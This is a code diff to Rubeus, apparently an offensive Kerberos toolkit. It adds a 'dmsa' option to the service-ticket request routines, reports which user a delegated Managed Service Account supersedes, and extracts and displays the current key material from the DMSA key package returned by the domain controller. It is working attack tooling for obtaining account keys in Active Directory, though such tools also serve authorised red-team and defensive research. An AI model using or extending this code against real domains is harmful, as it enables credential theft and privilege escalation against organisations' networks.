@@ -62,6 +62,12 @@ namespace Rubeus {
                 try
                 {
                     Console.WriteLine("\r\n[X] KRB-ERROR ({0}) : {1}: {2}\r\n", error.error_code, (Interop.KERBEROS_ERROR)error.error_code, error.e_text);
+                    if(error.e_data[0].type == Interop.PADATA_TYPE.SUPERSEDED_BY_USER)
+                    {
+                        PA_SUPERSEDED_BY_USER obj = (PA_SUPERSEDED_BY_USER)error.e_data[0].value;
+                        Console.WriteLine("[*] {0} is superseded by {1}", userName, obj.name.name_string[0]);
+                    }
+                    
                 }
                 catch
                 {
@@ -318,7 +324,7 @@ namespace Rubeus {
             }
         }
 
-        public static void TGS(KRB_CRED kirbi, string service, Interop.KERB_ETYPE requestEType = Interop.KERB_ETYPE.subkey_keymaterial, string outfile = "", bool ptt = false, string domainController = "", bool display = true, bool enterprise = false, bool roast = false, bool opsec = false, KRB_CRED tgs = null, string targetDomain = "", string servicekey = "", string asrepkey = "", bool u2u = false, string targetUser = "", bool printargs = false, string proxyUrl = null, bool keyList = false)
+        public static void TGS(KRB_CRED kirbi, string service, Interop.KERB_ETYPE requestEType = Interop.KERB_ETYPE.subkey_keymaterial, string outfile = "", bool ptt = false, string domainController = "", bool display = true, bool enterprise = false, bool roast = false, bool opsec = false, KRB_CRED tgs = null, string targetDomain = "", string servicekey = "", string asrepkey = "", bool u2u = false, string targetUser = "", bool printargs = false, string proxyUrl = null, bool keyList = false, bool dmsa = false)
         {
             // kirbi            = the TGT .kirbi to use for ticket requests
             // service          = the SPN being requested
@@ -340,12 +346,12 @@ namespace Rubeus {
             foreach (string sname in services)
             {
                 // request the new service ticket
-                TGS(userName, domain, ticket, clientKey, paEType, sname, requestEType, outfile, ptt, domainController, display, enterprise, roast, opsec, tgs, targetDomain, servicekey, asrepkey, u2u, targetUser, printargs, proxyUrl, keyList);
+                TGS(userName, domain, ticket, clientKey, paEType, sname, requestEType, outfile, ptt, domainController, display, enterprise, roast, opsec, tgs, targetDomain, servicekey, asrepkey, u2u, targetUser, printargs, proxyUrl, keyList, dmsa);
                 Console.WriteLine();
             }
         }
 
-        public static byte[] TGS(string userName, string domain, Ticket providedTicket, byte[] clientKey, Interop.KERB_ETYPE paEType, string service, Interop.KERB_ETYPE requestEType = Interop.KERB_ETYPE.subkey_keymaterial, string outfile = "", bool ptt = false, string domainController = "", bool display = true, bool enterprise = false, bool roast = false, bool opsec = false, KRB_CRED tgs = null, string targetDomain = "", string servicekey = "", string asrepkey = "", bool u2u = false, string targetUser = "", bool printargs = false, string proxyUrl = null, bool keyList = false)
+        public static byte[] TGS(string userName, string domain, Ticket providedTicket, byte[] clientKey, Interop.KERB_ETYPE paEType, string service, Interop.KERB_ETYPE requestEType = Interop.KERB_ETYPE.subkey_keymaterial, string outfile = "", bool ptt = false, string domainController = "", bool display = true, bool enterprise = false, bool roast = false, bool opsec = false, KRB_CRED tgs = null, string targetDomain = "", string servicekey = "", string asrepkey = "", bool u2u = false, string targetUser = "", bool printargs = false, string proxyUrl = null, bool keyList = false, bool dmsa = false)
         {
 
             if (display)
@@ -361,6 +367,8 @@ namespace Rubeus {
 
                 if (keyList)
                     Console.WriteLine("[*] Building KeyList TGS-REQ request for: '{0}'", userName);
+                else if (dmsa)
+                    Console.WriteLine("[*] Building DMSA TGS-REQ request for: '{0}'", userName);
                 else if (!String.IsNullOrEmpty(service))
                     Console.WriteLine("[*] Building TGS-REQ request for: '{0}'", service);
                 else if (u2u)
@@ -374,7 +382,7 @@ namespace Rubeus {
             if (u2u && tgs != null && String.IsNullOrEmpty(service))
                 service = tgs.enc_part.ticket_info[0].pname.name_string[0];
 
-            byte[] tgsBytes = TGS_REQ.NewTGSReq(userName, domain, service, providedTicket, clientKey, paEType, requestEType, false, targetUser, enterprise, roast, opsec, false, tgs, targetDomain, u2u, keyList);
+            byte[] tgsBytes = TGS_REQ.NewTGSReq(userName, domain, service, providedTicket, clientKey, paEType, requestEType, false, targetUser, enterprise, roast, opsec, false, tgs, targetDomain, u2u, keyList, dmsa);
 
             byte[] response = null;
             string dcIP = null;
@@ -426,7 +434,13 @@ namespace Rubeus {
                 {
                     keyListHash = Helpers.ByteArrayToString(encRepPart.encryptedPaData.PA_KEY_LIST_REP.encryptionKey.keyvalue);
                 }
-                
+
+                // extract current-keys and previous-keys from DMSA_KEY_PACKAGE 
+                string dmsaCurrentKeys = null;
+                if (dmsa)
+                {
+                    dmsaCurrentKeys = Helpers.ByteArrayToString(encRepPart.encryptedPaData.PA_DMSA_KEY_PACKAGE.currentKeys.encryptionKey.keyvalue);
+                }
 
                 // if using /opsec and the ticket is for a server configuration for unconstrained delegation, request a forwardable TGT
                 if (opsec && (!roast) && ((encRepPart.flags & Interop.TicketFlags.ok_as_delegate) != 0))
@@ -525,7 +539,7 @@ namespace Rubeus {
 
                     LSA.DisplayTicket(kirbi, 2, false, false, false, false, 
                         string.IsNullOrEmpty(servicekey) ? null : Helpers.StringToByteArray(servicekey), string.IsNullOrEmpty(asrepkey) ? null : Helpers.StringToByteArray(asrepkey),
-                        null,null,null,string.IsNullOrEmpty(keyListHash) ? null : Helpers.StringToByteArray(keyListHash));
+                        null,null,null,string.IsNullOrEmpty(keyListHash) ? null : Helpers.StringToByteArray(keyListHash), null, string.IsNullOrEmpty(dmsaCurrentKeys) ? null : Helpers.StringToByteArray(dmsaCurrentKeys));
                 }
 
                 if (!String.IsNullOrEmpty(outfile))
